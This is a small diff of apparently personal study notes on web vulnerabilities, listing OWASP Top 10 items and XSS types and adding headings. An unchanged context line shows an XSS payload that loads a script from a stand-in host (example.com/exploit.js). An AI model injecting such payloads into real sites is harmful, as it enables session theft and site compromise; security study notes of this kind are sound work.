@@ -32,7 +32,7 @@ three main categories:
 8. Software and Data Integrity Failures
 9. Security Logging and Monitoring Failures
 10. Server-Side Request Forgery (SSRF)
-# FrontEnd 
+# FrontEnd Vulnerabilities
 ## Cross-Site Scripting (XSS)
 - **3 types**: `Reflected XSS`, `Stored XSS`, `DOM XSS`
 ```javascript
@@ -47,6 +47,9 @@ three main categories:
 ```html
 "><script src=//www.example.com/exploit.js></script>
 ```
+
+# BackEnd Vulnerabilities
+
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIxMzkzNzg1NjAsMTk2NTg1Njg2Ml19
+eyJoaXN0b3J5IjpbNDM4MjY3NjE3LDE5NjU4NTY4NjJdfQ==
 -->
